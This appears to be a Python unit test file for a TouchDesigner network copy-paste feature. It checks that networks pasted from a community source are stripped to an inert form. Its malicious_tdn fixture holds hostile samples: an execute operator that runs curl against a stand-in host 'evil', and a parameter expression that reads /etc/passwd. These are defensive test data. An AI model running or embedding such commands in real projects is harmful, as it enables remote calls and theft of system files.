import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import copy_paste_logic
import tdn_envelope
import safe_import


def clean_tdn():
    return {
        "format": "tdn",
        "version": "1.4",
        "network_path": "/test",
        "type": "baseCOMP",
        "operators": [{"name": "null1", "type": "nullTOP"}],
    }


def malicious_tdn():
    return {
        "format": "tdn",
        "version": "1.4",
        "network_path": "/test",
        "type": "baseCOMP",
        "operators": [
            {
                "name": "execute1",
                "type": "executeDAT",
                "dat_content": "import os\nos.system('curl http://evil')\n",
                "dat_content_format": "text",
            },
            {"name": "glow1", "type": "levelTOP", "parameters": {"gamma": "=open('/etc/passwd').read()"}},
            {"name": "rig1", "type": "baseCOMP", "storage": {"k": "v"}},
        ],
    }


class TestCopyPasteLogic(unittest.TestCase):
    def test_build_copy_envelope_is_valid(self):
        env = copy_paste_logic.build_copy_envelope(clean_tdn(), source="embody", slug="x", version=2)
        self.assertTrue(tdn_envelope.is_embody_tdn_envelope(env))
        self.assertEqual(env["source"], "embody")
        self.assertEqual(env["slug"], "x")
        self.assertEqual(env["version"], 2)

    def test_plan_paste_no_tdn(self):
        self.assertEqual(copy_paste_logic.plan_paste("not json"), {"ok": False, "reason": "no_tdn"})
        self.assertEqual(copy_paste_logic.plan_paste('{"a":1}'), {"ok": False, "reason": "no_tdn"})

    def test_plan_paste_own_source_is_direct(self):
        env = copy_paste_logic.build_copy_envelope(malicious_tdn(), source="embody")
        plan = copy_paste_logic.plan_paste(tdn_envelope.to_clipboard_str(env))
        self.assertTrue(plan["ok"])
        self.assertEqual(plan["mode"], "direct")
        self.assertIsNone(plan["summary"])
        self.assertEqual(plan["tdn"], malicious_tdn())  # own network imported as-is
        self.assertTrue(plan["integrity_ok"])

    def test_plan_paste_community_source_is_inert(self):
        env = copy_paste_logic.build_copy_envelope(malicious_tdn(), source="embody.tools", slug="s1")
        plan = copy_paste_logic.plan_paste(tdn_envelope.to_clipboard_str(env))
        self.assertTrue(plan["ok"])
        self.assertEqual(plan["mode"], "inert")
        self.assertEqual(plan["source"], "embody.tools")
        self.assertEqual(plan["slug"], "s1")
        # capability summary surfaced the surfaces
        self.assertGreaterEqual(plan["capability"]["counts"]["execute_dats"], 1)
        self.assertGreaterEqual(plan["capability"]["counts"]["storage_payloads"], 1)
        # the tdn handed to the importer is inert, and the summary reports neutralization
        self.assertTrue(safe_import.is_inert(plan["tdn"]))
        self.assertGreaterEqual(plan["summary"]["storage_removed"], 1)

    def test_plan_paste_does_not_mutate_clean_for_inert(self):
        # community paste of a clean network: still inert mode, but nothing to neutralize
        env = copy_paste_logic.build_copy_envelope(clean_tdn(), source="embody.tools")
        plan = copy_paste_logic.plan_paste(tdn_envelope.to_clipboard_str(env))
        self.assertEqual(plan["mode"], "inert")
        self.assertTrue(safe_import.is_inert(plan["tdn"]))
        self.assertEqual(plan["capability"]["verdict"], "clean")


if __name__ == "__main__":
    unittest.main()
